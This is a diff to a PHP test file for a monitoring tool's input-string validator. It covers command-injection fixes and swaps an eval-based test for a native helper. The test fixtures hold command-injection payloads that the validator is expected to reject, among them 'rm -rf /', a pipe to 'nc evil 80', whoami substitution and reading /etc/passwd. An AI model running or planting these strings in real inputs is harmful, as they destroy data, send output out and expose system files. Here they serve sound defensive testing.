@@ -27,13 +27,14 @@
  *      return false (refusing to persist) when an XML/package payload
  *      smuggles a metacharacter the GUI would have rejected.
  *
- *   4) data_input.php form_save() must use the shared validator instead
- *      of an inline regex so the two paths cannot drift.
+ *   The migrated GUI persistence boundary is exercised by the real HTTP
+ *   worker scenarios, including rejection without modifying the stored command.
  */
+
+require_once __DIR__ . '/../Helpers/InputStringValidator.php';
 
 $scriptServerSource = file_get_contents(__DIR__ . '/../../script_server.php');
 $functionsSource    = file_get_contents(__DIR__ . '/../../lib/functions.php');
-$dataInputSource    = file_get_contents(__DIR__ . '/../../data_input.php');
 $importSource       = file_get_contents(__DIR__ . '/../../lib/import.php');
 
 /* --- Finding 1: script_server validates path unconditionally --- */
@@ -92,59 +93,46 @@ test('cacti_input_string_is_safe is defined in lib/functions.php', function () u
         ->not->toBeFalse();
 });
 
-test('cacti_input_string_is_safe extracts and runs against canonical payloads', function () use ($functionsSource) {
-    /* Pull the function definition out of lib/functions.php and evaluate it
-     * in test scope. Requiring the whole file would drag in the full Kadupul
-     * bootstrap, which other tests in this directory deliberately avoid. */
-    preg_match(
-        '/^function cacti_input_string_is_safe\([^)]*\)\s*\{.*?^\}/sm',
-        $functionsSource,
-        $m
-    );
-    expect($m)->not->toBeEmpty('cacti_input_string_is_safe definition must be extractable');
-
-    /* Rename to avoid colliding if another test loaded the real one. */
-    $src = preg_replace('/^function cacti_input_string_is_safe\(/m', 'function _test_input_string_is_safe(', $m[0]);
-    if (!function_exists('_test_input_string_is_safe')) {
-        eval($src);
-    }
+test('native input validator runs against canonical payloads', function () {
+    $coverage = $this->getTestResultObject()->getCodeCoverage();
+    $isSafe = static fn($input) => test_native_input_string_is_safe($input, $coverage);
 
     /* placeholder syntax stays safe */
-    expect(_test_input_string_is_safe(''))->toBeTrue();
-    expect(_test_input_string_is_safe('snmpwalk -v 2c -c <community> <host>'))->toBeTrue();
-    expect(_test_input_string_is_safe('/usr/local/bin/check.sh <host_ip>'))->toBeTrue();
+    expect($isSafe(''))->toBeTrue();
+    expect($isSafe('snmpwalk -v 2c -c <community> <host>'))->toBeTrue();
+    expect($isSafe('/usr/local/bin/check.sh <host_ip>'))->toBeTrue();
 
     /* Legitimate templates that the strip pattern must accept after the
      * issue #7121 fix: paired quotes around placeholders are standard shell
      * arg-quoting, and digit-suffixed placeholder names are common in
      * grid/RTM-style packages. Both were rejected by the original strip
      * (<[a-zA-Z_]+>) plus the GHSA-c4qp blocklist. */
-    expect(_test_input_string_is_safe('<path_cacti>/scripts/ss_grid_preason.php ss_grid_preason <clusterid> "<reason>"'))->toBeTrue();
-    expect(_test_input_string_is_safe('<path_php_binary> -q <path_cacti>/scripts/x.php --hostname="<host>" --community="<community>"'))->toBeTrue();
-    expect(_test_input_string_is_safe("<path_cacti>/scripts/x.php '<reason>'"))->toBeTrue();
-    expect(_test_input_string_is_safe('<path_cacti>/scripts/x.php <arg1> <host_id2>'))->toBeTrue();
-    expect(_test_input_string_is_safe('<path_php_binary> -q <path_cacti>/scripts/x.php "<arg1>"'))->toBeTrue();
+    expect($isSafe('<path_cacti>/scripts/ss_grid_preason.php ss_grid_preason <clusterid> "<reason>"'))->toBeTrue();
+    expect($isSafe('<path_php_binary> -q <path_cacti>/scripts/x.php --hostname="<host>" --community="<community>"'))->toBeTrue();
+    expect($isSafe("<path_cacti>/scripts/x.php '<reason>'"))->toBeTrue();
+    expect($isSafe('<path_cacti>/scripts/x.php <arg1> <host_id2>'))->toBeTrue();
+    expect($isSafe('<path_php_binary> -q <path_cacti>/scripts/x.php "<arg1>"'))->toBeTrue();
 
     /* original metachar set */
-    expect(_test_input_string_is_safe('cmd <host>; rm -rf /'))->toBeFalse();
-    expect(_test_input_string_is_safe('cmd <host> && reboot'))->toBeFalse();
-    expect(_test_input_string_is_safe('cmd <host> | nc evil 80'))->toBeFalse();
-    expect(_test_input_string_is_safe('echo `whoami`'))->toBeFalse();
-    expect(_test_input_string_is_safe('echo $IFS$9'))->toBeFalse();
-    expect(_test_input_string_is_safe("template\nwith\nnewline"))->toBeFalse();
-    expect(_test_input_string_is_safe("template\rwith\rcr"))->toBeFalse();
-    expect(_test_input_string_is_safe('echo \\$(whoami)'))->toBeFalse();
+    expect($isSafe('cmd <host>; rm -rf /'))->toBeFalse();
+    expect($isSafe('cmd <host> && reboot'))->toBeFalse();
+    expect($isSafe('cmd <host> | nc evil 80'))->toBeFalse();
+    expect($isSafe('echo `whoami`'))->toBeFalse();
+    expect($isSafe('echo $IFS$9'))->toBeFalse();
+    expect($isSafe("template\nwith\nnewline"))->toBeFalse();
+    expect($isSafe("template\rwith\rcr"))->toBeFalse();
+    expect($isSafe('echo \\$(whoami)'))->toBeFalse();
 
     /* GHSA-c4qp bypass chars added in this PR: single-quote, double-quote,
      * redirect operators, and subshell delimiters.
      * Payloads that were accepted before the fix and must now be rejected. */
-    expect(_test_input_string_is_safe("/bin/sh -c 'id'"))->toBeFalse();
-    expect(_test_input_string_is_safe('/usr/bin/curl http://x > /tmp/out'))->toBeFalse();
-    expect(_test_input_string_is_safe('echo "hello"'))->toBeFalse();
-    expect(_test_input_string_is_safe('/bin/sh -c (id)'))->toBeFalse();
-    expect(_test_input_string_is_safe('cmd {dangerous}'))->toBeFalse();
+    expect($isSafe("/bin/sh -c 'id'"))->toBeFalse();
+    expect($isSafe('/usr/bin/curl http://x > /tmp/out'))->toBeFalse();
+    expect($isSafe('echo "hello"'))->toBeFalse();
+    expect($isSafe('/bin/sh -c (id)'))->toBeFalse();
+    expect($isSafe('cmd {dangerous}'))->toBeFalse();
     /* redirect < */
-    expect(_test_input_string_is_safe('cmd < /etc/passwd'))->toBeFalse();
+    expect($isSafe('cmd < /etc/passwd'))->toBeFalse();
 });
 
 /* --- Finding 3: import path applies the same validator --- */
@@ -179,13 +167,5 @@ test('xml_to_data_input_method runs cacti_input_string_is_safe before persisting
     );
 });
 
-/* --- Finding 4: data_input.php uses the shared helper --- */
-
-test('data_input.php form_save uses cacti_input_string_is_safe', function () use ($dataInputSource) {
-    expect(strpos($dataInputSource, "cacti_input_string_is_safe(\$save['input_string'])"))
-        ->not->toBeFalse('GUI save must call the shared helper');
-
-    /* The previous inline regex must be gone so the two paths cannot drift. */
-    expect(strpos($dataInputSource, "preg_match('/[;&|`\$\\\\\\\\\\n\\r]/'"))
-        ->toBeFalse('the inline shell-metacharacter regex must be replaced by the helper');
-});
+// The migrated GUI/worker persistence boundary is exercised by the real
+// shell-metacharacter rejection scenario in tests/Symfony/data_input_scenarios.py.
